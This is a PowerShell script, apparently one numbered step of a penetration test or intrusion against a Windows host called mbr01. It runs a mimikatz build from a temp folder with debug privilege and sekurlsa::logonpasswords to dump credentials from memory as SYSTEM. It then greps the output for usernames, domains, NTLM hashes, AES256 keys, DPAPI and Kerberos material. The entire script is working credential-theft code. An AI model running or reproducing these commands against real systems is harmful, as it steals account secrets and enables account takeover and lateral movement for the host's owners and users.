# 3.5K v2: trunk mimikatz (newer build) — live sekurlsa as SYSTEM on mbr01
$ErrorActionPreference = 'Continue'
$exe = 'C:\Windows\Temp\cadre-tools\mimikatz-trunk.exe'
$outFile = 'C:\Windows\Temp\cadre-mimikatz-trunk.txt'

# version banner first
cmd.exe /c "`"$exe`" version exit > `"$outFile`" 2>&1"
Start-Sleep -Seconds 1
Write-Output '=== TRUNK VERSION ==='
Get-Content $outFile -ErrorAction SilentlyContinue | Select-Object -First 6 | ForEach-Object { Write-Output "VER|$_" }

# sekurlsa live
Remove-Item $outFile -ErrorAction SilentlyContinue
cmd.exe /c "`"$exe`" privilege::debug sekurlsa::logonpasswords exit > `"$outFile`" 2>&1"
Start-Sleep -Seconds 2
Write-Output "MIK_OUT_EXISTS $(Test-Path $outFile)"
if (Test-Path $outFile) {
    $sz = (Get-Item $outFile).Length
    Write-Output "MIK_OUT_SIZE $sz"
    Get-Content $outFile | Select-String -Pattern 'Authentication Id|Username|Domain|NTLM|AES256|DPAPI|msv|tspkg|wdigest|kerberos|mimikatz|ERROR' | Select-Object -First 60 | ForEach-Object { $_.Line }
}
Write-Output '3.5K_V2_DONE'
